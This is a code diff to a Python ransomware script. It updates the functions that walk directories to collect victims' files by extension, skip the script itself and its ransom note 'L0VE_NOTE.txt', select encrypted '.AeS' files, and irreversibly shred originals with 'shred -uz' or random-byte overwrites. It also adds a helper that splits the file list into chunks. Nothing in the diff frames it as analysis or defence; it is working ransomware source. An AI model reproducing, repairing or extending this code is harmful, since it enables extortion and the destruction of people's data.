@@ -16,9 +16,8 @@ def recursive_walk(paths, target_extensions, mode):
     """
 
     file_list = []
-    for path in tqdm(paths, smoothing=0.5, desc="Gathering files...."):
-        # root=path, _=subdirectories, files=files of any type
-        for root, _, files in os.walk(path):
+    for path in tqdm(paths, leave=True, smoothing=0.5, desc="Gathering files...."):
+        for root, _, files in os.walk(path):  # root=path, _=subdirectories, files=files of any type
             for file in files:
                 if file not in [sys.argv[0], "L0VE_NOTE.txt"]:  # Don't encrypt self or ransom note
                     abs_path = os.path.join(root, file)         # Get the files absolute path
@@ -27,7 +26,7 @@ def recursive_walk(paths, target_extensions, mode):
                         if ext in target_extensions:
                             file_list.append(os.path.join(root, file))
                     elif mode == 2:
-                        if ".AeS" in file:
+                        if "AeS" in ext:  # Updated from file to ext, updated from .AeS to AeS
                             file_list.append(os.path.join(root, file))
     return file_list
 
@@ -46,18 +45,31 @@ def secure_delete(filename):
     try:
         # -u deletes file after complete, -z zeroes the file at the end, hiding that it was shredded
         os.system("shred -uz {} >/dev/null 2>&1".format(filename))
-    except (FileNotFoundError, OSError, BlockingIOError):
-        f = None
-        try:
-            f = open(filename, "ab+")
-            length = f.tell()  # Read each line of the file until the end
-            for _ in range(0, 3):  # _ in python is short for a variable that isn't used
-                f.seek(0)  # Move back to the start of the file
-                f.write(os.urandom(length))  # Write garbage to file
-        finally:
-            if f is not None:
-                f.close()
-        os.remove(filename)
+    except (FileNotFoundError, OSError, BlockingIOError, Exception):
+            with open(filename, "ab") as f:
+                length = f.tell()      # Read each line of the file until the end
+                for _ in range(0, 3):  # _ in python is short for a variable that isn't used
+                    f.seek(0)          # Move back to the start of the file
+                    f.write(os.urandom(length))  # Write garbage to file
+            os.remove(filename)
+
+
+def parse_array(array):
+    """
+    Determine how many times an array should be split
+
+    :type array:    Array to parse
+    :return chunks: Amount of chunks to pass to create_chunks as n
+    """
+
+    chunks = 0
+    if len(array) > 100000:
+        chunks += 10
+    elif len(array) > 50000:
+        chunks += 6
+    else:
+        chunks += 4
+    return chunks
 
 
 def create_chunks(array, n):
